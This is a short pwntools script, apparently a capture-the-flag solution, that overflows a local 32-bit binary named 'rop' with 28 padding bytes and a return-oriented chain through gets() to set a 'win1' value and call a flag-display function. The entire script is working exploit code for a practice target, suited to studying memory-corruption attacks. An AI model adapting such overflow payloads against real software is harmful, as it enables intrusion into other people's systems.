from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = process('./rop')
p = gdb.debug('./rop')

display_flag = p32(0x080486b3)
win1 = p32(0x0804a03d)
gets = p32(0x08048430)
ones = b'\x01'*3

payload = b'a'*28
payload += gets
payload += display_flag
payload += win1

p.sendline(payload)
p.sendline(ones)
print(p.recvall())
